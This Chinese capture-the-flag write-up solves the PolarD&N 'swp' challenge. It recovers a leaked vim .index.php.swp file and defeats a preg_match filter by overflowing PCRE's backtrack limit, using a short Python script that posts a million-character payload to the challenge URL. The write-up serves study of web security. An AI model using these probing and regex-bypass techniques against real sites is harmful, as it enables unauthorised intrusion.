---
date: 2001-01-01
tags:
  - Others
categories:
  - Others
title: "[PolarD&N]swp"
---
# [PolarD&N]swp

【敏感文件泄露】

打开题目有提示“true .swp file?”
一个关于 `.swp`泄露的题目
`.swp` 一个临时交换文件，用来备份缓冲区中的内容。vim/vi 编辑器操作文件时由于非正常关闭所导致的`.swp`文件没有自动删除而保留下来。当源文件被意外删除则可通过`.swp`进行恢复。
目录扫描或者猜测路径的方式得到`.index.php.swp`。（提示`.swp`，肯定是首页`index.php`的泄露啦~不知道还能怎么猜）
访问`http://dc547e9f-3df5-48bc-9b0b-bda93c72564f.www.polarctf.com:8090/.index.php.swp`，查看源码进行分析。

```php
function jiuzhe($xdmtql){
    return preg_match('/sys.*nb/is',$xdmtql);    # 正则匹配sys nb
}

$xdmtql=@$_POST['xdmtql'];    # 通过 POST 请求获取参数 xdmtql
if(!is_array($xdmtql)){    # 判断是否是数组，不是数组则进入
    if(!jiuzhe($xdmtql)){    # 函数判断，函数返回false 进入
        if(strpos($xdmtql,'sys nb')!==false){    # 在参数中查找sys nb 进行判断
            echo 'flag{*******}';
        }else{
            echo 'true .swp file?';
        }
    }else{
        echo 'nijilenijile';
    }
}
```

通过 POST 请求获取参数 xdmtql，参数中必须包含 sys nb 的字符串。需要进行正则绕过，绕过之后再通过`strops`判断获取 flag 。
对于 PHP 中的 `preg_match` 函数，他因为会不断进行回溯递归的正则匹配，消耗大量的资源，所以当传入的字符串长度超过一定的限制的时候，就会直接返回一个 `false`，这个长度限制就是 **100 万个字符** 。

```python
import requests

data = {"xdmtql": "sys nb" + "a" * 1000000}
res = requests.post(
    "http://dc547e9f-3df5-48bc-9b0b-bda93c72564f.www.polarctf.com:8090/",
    data=data,
    allow_redirects=False,
)
print(res.content)

```

> 参考学习：
> https://blog.csdn.net/weixin_46029520/article/details/130173887